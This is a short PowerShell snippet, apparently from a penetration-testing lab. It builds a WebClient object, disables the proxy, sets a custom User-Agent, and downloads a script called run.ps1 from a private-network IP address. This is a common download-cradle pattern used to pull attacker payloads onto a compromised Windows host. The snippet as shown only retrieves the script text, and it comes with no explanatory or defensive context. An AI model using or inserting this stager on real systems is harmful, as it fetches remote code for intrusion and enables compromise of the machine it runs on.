$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...") 
$wc.DownloadString("http://192.168.119.22/run.ps1")